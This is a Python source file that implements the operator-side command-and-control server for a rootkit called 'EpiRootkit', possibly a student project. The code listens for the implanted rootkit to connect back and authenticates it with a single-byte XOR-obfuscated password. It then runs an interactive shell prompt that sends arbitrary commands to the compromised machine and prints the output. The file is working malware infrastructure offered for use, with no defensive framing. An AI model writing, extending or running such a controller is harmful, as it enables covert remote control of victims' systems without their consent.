import argparse
import socket
import logging
import sys

# Encryption key must match the rootkit's key (1-byte XOR key).
XOR_KEY = 0x2A

def xor_encrypt_decrypt(data: bytes) -> bytes:
    """XOR encrypt/decrypt the given byte array with the shared key."""
    return bytes(b ^ XOR_KEY for b in data)

class EpiRootkitClient:
    """Attacking program server for the EpiRootkit."""
    def __init__(self, host: str, port: int, password: str, debug: bool = False):
        self.host = host
        self.port = port
        self.password = password
        # Initialize logging level
        log_level = logging.DEBUG if debug else logging.INFO
        logging.basicConfig(level=log_level, format='[%(levelname)s] %(message)s')
        # Create a listening socket for incoming rootkit connection
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Reuse address to avoid TIME_WAIT issues on quick restarts
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
        except socket.error as e:
            logging.error(f"Failed to bind on {self.host}:{self.port} – {e}")
            sys.exit(1)
        self.server_socket.listen(1)
        logging.info(f"Listening on {self.host}:{self.port} for rootkit connection...")

    def start(self):
        """Main loop to accept rootkit connections and handle sessions."""
        try:
            while True:
                # Wait for the rootkit to connect
                conn, addr = self.server_socket.accept()
                logging.info(f"[*] Rootkit connected from {addr}")
                try:
                    # Perform authentication handshake
                    authed = self._authenticate(conn)
                except Exception as e:
                    logging.error(f"Authentication error: {e}")
                    conn.close()
                    continue

                if not authed:
                    logging.warning("Authentication failed. Closing connection.")
                    conn.close()
                    continue
                logging.info("[*] Authentication successful. Starting interactive session.")

                # Handle interactive command session until disconnection or exit
                try:
                    self._handle_session(conn)
                except Exception as e:
                    logging.error(f"Session error: {e}")
                finally:
                    conn.close()
                    logging.info("[*] Connection closed. Waiting for reconnection...")
                    # Loop continues to accept the next connection (persistent retry by rootkit)
        except KeyboardInterrupt:
            logging.info("Server shutting down.")
        finally:
            self.server_socket.close()

    def _authenticate(self, conn: socket.socket) -> bool:
        """Exchange authentication with the rootkit. Returns True if successful."""
        # Send the password (encrypted) as the first message
        pw_bytes = self.password.encode('utf-8')
        encrypted_pw = xor_encrypt_decrypt(pw_bytes)
        conn.sendall(encrypted_pw)
        logging.debug("Sent encrypted authentication password to rootkit.")

        # Receive the rootkit's response (expected "OK" or "FAIL")
        conn.settimeout(5.0)  # timeout to avoid hanging if no response
        try:
            data = conn.recv(1024)
        except socket.timeout:
            logging.error("Authentication response timed out.")
            return False
        finally:
            conn.settimeout(None)  # remove timeout for further operations

        if not data:
            logging.error("Rootkit closed connection during authentication.")
            return False

        # Decrypt and decode the response
        response = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore').strip()
        logging.debug(f"Received auth response: {response}")
        return response == "OK"

    def _handle_session(self, conn: socket.socket):
        """Interactively handle commands for an established connection."""
        # Use sys.stdout.write for prompt to avoid newline issues with print
        while True:
            try:
                cmd = input("epirootkit> ")
            except EOFError:
                # End of input (e.g., Ctrl+D)
                logging.info("Input stream closed. Ending session.")
                break

            if not cmd:
                # Empty command entered; just reprompt
                continue

            if cmd in ("exit", "quit"):
                # Exit the session: instruct rootkit to disconnect
                encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
                conn.sendall(encrypted_cmd)
                logging.info("Sent exit command to rootkit. Closing session.")
                break

            # Send the command to the rootkit (encrypted)
            encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
            conn.sendall(encrypted_cmd)
            logging.debug(f"Sent command: {cmd}")

            # Receive and display the output until the EOF marker is encountered
            output_buffer = ""
            while True:
                data = conn.recv(4096)
                if not data:
                    # Connection lost unexpectedly
                    logging.warning("Connection lost while receiving command output.")
                    return  # exit the session handler to allow reconnect
                # Decrypt the data chunk
                chunk = xor_encrypt_decrypt(data)
                # Decode to text (ignore any decoding errors to handle binary data safely)
                text_chunk = chunk.decode('utf-8', errors='ignore')
                # Check for the end-of-output marker
                if "--EOF--" in text_chunk:
                    # Append everything before the marker, then break
                    before_eof, _ = text_chunk.split("--EOF--", 1)
                    output_buffer += before_eof
                    logging.debug("End-of-output marker received.")
                    break
                else:
                    # No marker yet; accumulate output and continue receiving
                    output_buffer += text_chunk
                    continue

            # Print the accumulated output (if any)
            if output_buffer:
                # Using end="" to avoid adding extra newline as output likely contains its own newlines
                print(output_buffer, end="")
            else:
                # If there's no output content, just print nothing (or could print a blank line if needed)
                pass

            # Clear the buffer for the next command
            output_buffer = ""
        # End of interactive loop
